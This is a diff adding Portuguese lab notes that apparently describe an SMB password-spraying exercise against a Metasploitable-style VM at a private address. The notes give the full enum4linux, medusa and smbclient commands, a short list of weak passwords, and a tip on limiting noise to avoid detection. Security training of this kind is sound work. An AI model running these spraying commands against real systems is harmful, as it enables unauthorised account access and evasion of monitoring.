@@ -1,0 +1,51 @@
+
+1° Passo é descobrir quais portas e usuários são interessantes poderiam levar a alguma informação importante e para isso utilizaremos o comando ![[Pasted image 20251110230646.png]]
+	enum4linux -a 192.168.56.101 | tee enum4_output.txt
+		enum4linux -> Ferramenta
+		-a -> ativara todas as enumerções possiveis
+		192.168.56.101 -> ip alvo
+		tee enum4_output.txt -> ira criar a saida do progrma em arquivo com as informações criadas  
+
+ABRINDO O TXT CRIADO COM AS INFORMAÇÕES 
+
+![[Pasted image 20251110230607.png]]
+Se caso aparecer esse aviso é só digitar Y
+Após isso ele mostrara as informações 
+![[Pasted image 20251110230845.png]]
+Usuários com potencial de informações
+![[Pasted image 20251110231148.png]]
+Criando uma lista de usuários 
+![[Pasted image 20251110231324.png]]
+	echo -e "user\nmsfadmin\nservice" > smb_users.txt
+sempre é melhor colocar os usuários que tiver mais chances de possuir informações, pois o quanto mais certeiro for, menor será o ruido e chance de ser detectado 
+
+Criando uma lista de senhas 
+![[Pasted image 20251110231730.png]]
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+Por se tratar de uma Password Spraying 
+ela irá testar a mesma senha para usuários diferentes usuários 
+
+## REALIZANDO ATAQUE
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+	medusa -h 192.168.56.101 -> ip alvo
+	-U smb_users.txt  -> lista de usuarios encontrada de acordo com a pesquisa 
+	 -P senhas_spray.txt -> lista de senhas fracas 
+	 -M smbnt -> serviço alvo (modo)
+	 -t 2 -> simular 2 usuarios testando senhas
+	 -T 50 -> Ate 50 hosts em paralelo 
+
+![[Pasted image 20251110232928.png]]
+![[Pasted image 20251110233010.png]]
+## CONSEGUIMOS ACESSO A CONTA DE ADMINTRADOR, QUE POSSUI ACESSO AO COMPARTILHAMENTO POR REDE
+
+para testar se realmente temos acesso a esse usuário iremos fazer uma tentativa de login através do comando 
+![[Pasted image 20251110233221.png]]
+smbclient -L //192.168.56.101 -U msfadmin
+
+Após inserir a senha ele ira logar no usuário
+onde existe compartilhamento de arquivos 
+![[Pasted image 20251110233412.png]]
+
+
